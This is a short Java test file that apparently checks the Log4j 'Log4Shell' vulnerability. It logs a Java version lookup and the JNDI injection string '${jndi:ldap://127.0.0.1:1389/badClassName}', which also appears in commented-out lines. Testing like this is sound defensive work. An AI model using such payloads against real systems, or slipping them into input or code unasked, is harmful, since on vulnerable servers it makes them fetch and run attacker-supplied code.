/*import com.wlqq.mon.galileo.logger.XLogger;
import com.wlqq.mon.galileo.logger.XLoggerFactory;*/

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author Arnold.zhao
 * @version Test.java, v 0.1 2021-12-10 14:09 Arnold.zhao Exp $$
 */
public class Test {
    private static final Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);

    public static void main(String[] args) {
        logger.error("java.version = ${java:version}, os = ${java:os}");

        logger.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
    }

//    public static void main(String[] args) {
        /*String t = "${jndi:ldap://127.0.0.1:8080}";
        logger.error("输出结果 " + t);
*/
//        String b = "${jndi:ldap://127.0.0.1:1389/badClassName}";
//        logger.error("输出结果:" + b);

        /*XLogger xLogger = XLoggerFactory.getLogger(Test.class);
        xLogger.info(">>>>>>>>>>>>>>>>>>>info >>>>>>>> test >>>>>>>>>>>");
        */
//    }
}
